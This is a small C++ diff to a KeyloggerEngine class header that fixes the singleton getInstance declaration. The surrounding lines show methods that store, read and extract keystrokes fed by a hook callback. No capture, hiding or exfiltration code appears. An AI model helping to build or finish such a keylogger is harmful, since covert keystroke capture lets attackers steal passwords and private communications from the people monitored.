@@ -18,7 +18,7 @@ class KeyloggerEngine {
     void write(int keyStroke);      //Only meant to be called by hook callback
     std::string read();
     std::string extract(int length);    //read + erase
-    static KeyloggerEngine& KeyloggerEngine::getInstance() {
+    static KeyloggerEngine& getInstance() {
         static KeyloggerEngine instance;
         return instance;
     }
